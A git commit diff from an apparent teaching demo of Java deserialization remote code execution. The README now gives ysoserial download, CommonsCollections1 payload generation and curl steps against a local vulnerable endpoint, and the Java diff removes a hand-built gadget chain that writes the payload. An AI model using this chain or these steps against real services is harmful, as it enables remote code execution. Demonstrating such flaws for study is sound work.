7599848a9f5c9320aedfe01e8e4067ec18ea2c79
Kamil Sajdok <kamil.sajdok@segwarez.com>
2025-05-25 23:54:01 +0200

    ysoserial

--- rce-demo/README.md
+++ rce-demo/README.md
@@ -2,11 +2,14 @@
 
 ## How To: Exploit vulnerability to perform RCE 
 
-1. Add JVM flag
+1. Download ysoserial.jar
 ```
---add-opens java.base/sun.reflect.annotation=ALL-UNNAMED
+curl -o ysoserial.jar https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT-b7d0f27b46-1/ysoserial-master-SNAPSHOT-b7d0f27b46-1.jar
 ```
-2. Run application to generate malicious payload
+2. Generate malicious payload
+```
+java -jar --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED ysoserial.jar CommonsCollections1 "open -a Calculator" > payload.bin
+```
 3. Send the payload to the vulnerable endpoint
 ```
 curl -X POST http://localhost:8080/vulnerable --data-binary @payload.bin -H 'Content-Type: application/octet-stream'
--- rce-demo/src/main/java/com/segwarez/rcedemo/RCEDemoApplication.java
+++ rce-demo/src/main/java/com/segwarez/rcedemo/RCEDemoApplication.java
@@ -1,46 +1,11 @@
 package com.segwarez.rcedemo;
 
-import org.apache.commons.collections.functors.InvokerTransformer;
-import org.apache.commons.collections.map.TransformedMap;
 import org.springframework.boot.SpringApplication;
 import org.springframework.boot.autoconfigure.SpringBootApplication;
 
-import java.io.FileOutputStream;
-import java.io.ObjectOutputStream;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Proxy;
-import java.util.HashMap;
-import java.util.Map;
-
 @SpringBootApplication
 public class RCEDemoApplication {
-    public static void main(String[] args) throws Exception {
-        generatePayload();
+    public static void main(String[] args) {
         SpringApplication.run(RCEDemoApplication.class, args);
-    }
-
-    private static void generatePayload() throws Exception {
-        InvokerTransformer transformer = new InvokerTransformer(
-                "exec",
-                new Class[]{String.class},
-                new Object[]{"open -a Calculator"}
-        );
-
-        var innerMap = new HashMap<>();
-        innerMap.put("value", "exploit");
-        var outerMap = TransformedMap.decorate(innerMap, null, transformer);
-
-        var clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
-        var ctor = clazz.getDeclaredConstructor(Class.class, Map.class);
-        ctor.setAccessible(true);
-
-        var handler = (InvocationHandler) ctor.newInstance(Override.class, outerMap);
-
-        var proxy = Proxy.newProxyInstance(RCEDemoApplication.class.getClassLoader(),
-                new Class[]{Map.class}, handler);
-
-        try (var objectOutputStream = new ObjectOutputStream(new FileOutputStream("payload.bin"))) {
-            objectOutputStream.writeObject(proxy);
-        }
     }
 }
